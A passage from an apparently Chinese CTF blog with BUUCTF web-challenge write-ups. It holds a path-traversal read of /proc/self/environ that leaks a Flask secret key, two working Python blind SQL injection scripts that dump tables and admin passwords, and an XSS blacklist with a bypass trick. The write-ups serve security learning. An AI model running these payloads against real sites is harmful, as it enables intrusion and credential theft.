&#123;<br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// 创建失败</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$value</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//数据压缩</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">gzcompress</span>(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>))<br>&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br><br></code></pre></td></tr></table></figure><h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>商店类型题目，一开始有1336，1337才能购买<code>flag</code>:</p><p><img src="/img/ctfhoneyshop1.png" alt="ctfhoneyshop1"></p><p>右键没啥有用的信息，先抓包看下<code>cookie</code>:</p><p><img src="/img/ctfhoneyshop2.png" alt="ctfhoneyshop2"></p><p>看到里面混着小数点觉得有点像<code>JWT</code>，解密一下看看：</p><p><img src="/img/ctfhoneyshop3.png" alt="ctfhoneyshop3"></p><p>还有个图片下载功能，这里很容易想到任意文件下载，不过要下载啥是个问题。。</p><p><img src="/img/ctfhoneyshop4.png" alt="ctfhoneyshop4"></p><p><code>../../etc/passwd</code></p><p><img src="/img/ctfhoneyshop5.png" alt="ctfhoneyshop5"></p><p>好像没乱用。。尝试下载<code>app.py</code>发现回显<code>not allowed</code></p><p>后面看了下<code>wp</code>发现要读<code>/proc/self/environ</code>这东西：</p><p><code>download?image=../../proc/self/environ</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/proc/</span>self<br><span class="hljs-regexp">//</span> 其路径指向当前进程<br><br>/environ<br><span class="hljs-regexp">//</span> 记录当前进程的环境变量信息<br></code></pre></td></tr></table></figure><p><code>SECRET_KEY=ijbufup9Ma6ZKnCWzvhodHqVjNMPk6Nw4NTNnbdr</code></p><p>然后<code>flask-unsign</code>解密再加密就行。</p><p><img src="/img/ctfhoneyshop6.png" alt="ctfhoneyshop6"></p><h4 id="思路总结：-2"><a href="#思路总结：-2" class="headerlink" title="思路总结："></a>思路总结：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">241148</span><span class="hljs-comment">#h2-1</span><br></code></pre></td></tr></table></figure><p>上面那个主要是对<code>proc</code>目录的一些解释。</p><p>还有<code>secret_key</code>可以放在环境变量里。</p><h2 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h2><p>登录界面用户名和密码是明文传输：</p><p><img src="/img/blackwatch1.png" alt="blackwatch1"></p><p>热点界面抓包如下：</p><p><img src="/img/blackwatch2.png" alt="blackwatch2"></p><p><code>id</code>这个东西看着像注入点，后面加了个<code>#</code>试了下发现正常回显，加<code>--+</code>回显<code>big big hack hack</code>。<code>FUZZ</code>下：</p><p><img src="/img/blackwatch3.png" alt="blackwatch3"></p><p>这些被过滤了。</p><p>试了试什么类型的注入，这东西不会报错，如果存在错误它会回显这么个东西：</p><p><img src="/img/blackwatch4.png" alt="blackwatch4"></p><p>简单布尔盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://9b4209a2-7433-46b6-9b61-e30207ddf793.node5.buuoj.cn:81/backend/content_detail.php&#x27;</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low=<span class="hljs-number">31</span><br>    high=<span class="hljs-number">127</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;=high:<br><br>        <span class="hljs-comment">#payload = &quot;if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid) #爆库：news</span><br>        <span class="hljs-comment">#payload = &quot;if(Ascii(Substr((Select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;news&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid)#爆表：admin,contents</span><br>        <span class="hljs-comment">#payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;admin&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid) #爆字段：id,username,password,is_enable</span><br>        <span class="hljs-comment">#payload = &quot;if(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid) #爆数据 15cadb68,f4fc64e0</span><br>        payload = <span class="hljs-string">&quot;if(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid) <span class="hljs-comment">#爆数据 07ab9020,43dc2dd9</span><br>        r = requests.get(url+<span class="hljs-string">&quot;?id=&quot;</span>+payload)<br>        <span class="hljs-comment">#r = requests.get(url=url,params=paylaod)</span><br>        time.sleep(<span class="hljs-number">0.03</span>)<br>        <span class="hljs-comment">#print(r.text)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-keyword">in</span> r.text):<br>            low = mid+<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid-<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>    result+=<span class="hljs-built_in">chr</span>(high+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    time.sleep(<span class="hljs-number">0.03</span>)<br></code></pre></td></tr></table></figure><p>好像挂着<code>VPN</code>不会出乱码？</p><h4 id="思路总结：-3"><a href="#思路总结：-3" class="headerlink" title="思路总结："></a>思路总结：</h4><p>简单布尔盲注</p><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>抓包：</p><p><img src="/img/onlineproxy1.png" alt="onlineproxy1"></p><p>回显存在<code>IP</code>，伪造一个？</p><p><img src="/img/onlineproxy2.png" alt="onlineproxy2"></p><p>新<code>IP</code>会把旧的顶掉。这里最开始想到是二次注入了，但是输入<code>1&#39; or &#39;1 </code>后再打一个新<code>IP</code>发现这个<code>1&#39; or &#39;1</code>LASTIP并没变成<code>1</code>。</p><p><a href="https://blog.csdn.net/qq_54929891/article/details/124464795">参考资料</a></p><blockquote><p>第一次输入1’or’1’&#x3D;’1的时候会直接显示出来<br>第二次输入2，因为和第一次输入不同，于是第一次输入存入到数据库中，并显示在Last ip中<br>第三次输入2，因为和第二次输入相同，相当于模拟的ip不再变化，因此这个时候会在数据库中查找ip2的last ip，执行了查询操作，因此这个地方是我们的利用点了</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://node4.buuoj.cn:28219/&#x27;</span><br> <br>res = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    left = <span class="hljs-number">31</span><span class="hljs-comment">#二分法快速查找关键字</span><br>    right = <span class="hljs-number">127</span><br>    mid = left + ((right - left)&gt;&gt;<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> left &lt; right:<span class="hljs-comment">#盲注，利用substr将查询到的字符切割，用ascii函数转化为ascii码，利用二分法的中间值比大小直到查询成功</span><br>        <span class="hljs-comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br>        payload = <span class="hljs-string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        headers = &#123;<span class="hljs-comment">#第一次请求，是用我们的payload，防止cookie被刷新因此我们头部请求的时候必须要带上cookie</span><br>                    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,<span class="hljs-comment">#带cookie防止刷新重置</span><br>                    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload<br>                    &#125;<br>        r = requests.post(url = url, headers = headers)<span class="hljs-comment">#头文件传输方法</span><br> <br>        payload = <span class="hljs-string">&#x27;111&#x27;</span><br>        headers = &#123;<span class="hljs-comment">#后面就是相同cookie的二次三次输入，只为了执行第一次payload的查询语句</span><br>                    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,<br>                    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload<br>                    &#125;<br>        r = requests.post(url = url, headers = headers)<br> <br>        payload = <span class="hljs-string">&#x27;111&#x27;</span><br>        headers = &#123;<br>                    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,<br>                    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload<br>                    &#125;<br>        r = requests.post(url = url, headers = headers)<br> <br> <br>        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">429</span>:<span class="hljs-comment">#buu特色</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;too fast&#x27;</span>)<br>            time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Last Ip: 1&#x27;</span>  <span class="hljs-keyword">in</span> r.text:<span class="hljs-comment">#payload语句用的都是大于，如果大于中值，则中值加一赋给最小值</span><br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;Last Ip: 1&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<span class="hljs-comment">#不小于则中值给最大值</span><br>            right = mid<br>        mid = left + ((right-left)&gt;&gt;<span class="hljs-number">1</span>)<span class="hljs-comment">#右移1，代表除2 可以直接mid=（left +right）//2</span><br>    <span class="hljs-keyword">if</span> mid == <span class="hljs-number">31</span> <span class="hljs-keyword">or</span> mid == <span class="hljs-number">127</span>:<br>        <span class="hljs-keyword">break</span><br>    res += <span class="hljs-built_in">chr</span>(mid)<span class="hljs-comment">#chr函数。ascii转化为字符</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(mid),res)<br>    time.sleep(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span><br><span class="hljs-comment">#F4l9_t4b1e</span><br><span class="hljs-comment">#F4l9_C01uMn</span><br></code></pre></td></tr></table></figure><h2 id="GWCTF-2019-mypassword-环境有问题，留着"><a href="#GWCTF-2019-mypassword-环境有问题，留着" class="headerlink" title="[GWCTF 2019]mypassword(环境有问题，留着)"></a>[GWCTF 2019]mypassword(环境有问题，留着)</h2><p>login.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> &amp;&amp; <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> != <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br><span class="hljs-keyword">var</span> cookies = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;; &#x27;</span>);<br><span class="hljs-keyword">var</span> cookie = &#123;&#125;;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; cookies.<span class="hljs-property">length</span>; i++) &#123;<br><span class="hljs-keyword">var</span> arr = cookies[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>);<br><span class="hljs-keyword">var</span> key = arr[<span class="hljs-number">0</span>];<br>cookie[key] = arr[<span class="hljs-number">1</span>];<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_">typeof</span>(cookie[<span class="hljs-string">&#x27;user&#x27;</span>]) != <span class="hljs-string">&quot;undefined&quot;</span> &amp;&amp; <span class="hljs-title function_">typeof</span>(cookie[<span class="hljs-string">&#x27;psw&#x27;</span>]) != <span class="hljs-string">&quot;undefined&quot;</span>)&#123;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;username&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span> = cookie[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;password&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span> = cookie[<span class="hljs-string">&#x27;psw&#x27;</span>];<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>大致就是利用<code>cookie</code>传递用户名和密码：</p><p>![GWCTF 2019mypassword2](img&#x2F;GWCTF 2019mypassword2.png)</p><p>存在<code>register.php</code>，随便注册一个登录：</p><p>![GWCTF 2019mypassword1](img&#x2F;GWCTF 2019mypassword1.png)</p><p>环境有问题。。这个页面应该还有<code>feedback,list,logout</code>这些功能但我重启了好几次还是这吊样，吗的。</p><p><code>feedback.php</code>右键存在注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$feedback</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;反馈不合法&#x27;);&lt;/script&gt;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;input&#x27;</span>,<span class="hljs-string">&#x27;script&#x27;</span>,<span class="hljs-string">&#x27;iframe&#x27;</span>,<span class="hljs-string">&#x27;host&#x27;</span>,<span class="hljs-string">&#x27;onload&#x27;</span>,<span class="hljs-string">&#x27;onerror&#x27;</span>,<span class="hljs-string">&#x27;srcdoc&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>,<span class="hljs-string">&#x27;svg&#x27;</span>,<span class="hljs-string">&#x27;form&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>,<span class="hljs-string">&#x27;src&#x27;</span>,<span class="hljs-string">&#x27;getElement&#x27;</span>,<span class="hljs-string">&#x27;document&#x27;</span>,<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$val</span>) &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$feedback</span>,<span class="hljs-variable">$val</span>) !== <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$feedback</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$val</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$feedback</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>简单替换过滤，直接把关键字替换成空了。<code>foreach</code>函数会遍历每个关键字，然后如果语句中存在对应关键字就换成空。比如可以通过构造<code>scriphostt</code>这种来构造我们需要的<code>payload</code>。</p><p>这里我看有些师傅说<code>cookie</code>放在最后了所以不能通过构造<code>coocookiekie</code>这种去拼。。不知道为啥：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$feedback</span> = <span class="hljs-string">&#x27;coocookiekie&#x27;</span>;<br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;input&#x27;</span>,<span class="hljs-string">&#x27;script&#x27;</span>,<span class="hljs-string">&#x27;iframe&#x27;</span>,<span class="hljs-string">&#x27;host&#x27;</span>,<span class="hljs-string">&#x27;onload&#x27;</span>,<span class="hljs-string">&#x27;onerror&#x27;</span>,<span class="hljs-string">&#x27;srcdoc&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>,<span class="hljs-string">&#x27;svg&#x27;</span>,<span class="hljs-string">&#x27;form&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>,<span class="hljs-string">&#x27;src&#x27;</span>,<span class="hljs-string">&#x27;getElement&#x27;</span>,<span class="hljs-string">&#x27;document&#x27;</span>,<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$val</span>) &#123;<br>    <span class="hljs-variable">$feedback</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$val</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$feedback</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$feedback</span>; <span class="hljs-comment">// 输出：&#x27;cookie&#x27;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>2024.1.12 这题环境有问题做不了，直接看<code>wp</code>的话和没做一样，留着后面看看能不能做吧</strong></p><h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-string">&quot;/var/babyctf/&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;/flag&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] ===<span class="hljs-string">&#x27;admin&#x27;</span>)<br>&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/var/babyctf/success.txt&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-title function_ invoke__">safe_delete</span>(<span class="hljs-variable">$filename</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] =<span class="hljs-string">&#x27;guest&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$direction</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;direction&#x27;</span>); <span class="hljs-comment">#filter_input函数用于获取post传递的对应参数的值</span><br><span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;attr&#x27;</span>);<br><span class="hljs-variable">$dir_path</span> = <span class="hljs-string">&quot;/var/babyctf/&quot;</span>.<span class="hljs-variable">$attr</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$attr</span>===<span class="hljs-string">&quot;private&quot;</span>)&#123;<br>    <span class="hljs-variable">$dir_path</span> .= <span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-comment">#在dir_path后追加/会话用户名，/var/babyctf/private/$_SESSION[&#x27;username&#x27;]</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$direction</span> === <span class="hljs-string">&quot;upload&quot;</span>)&#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;invalid upload&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_path</span> .= <span class="hljs-string">&quot;_&quot;</span>.<span 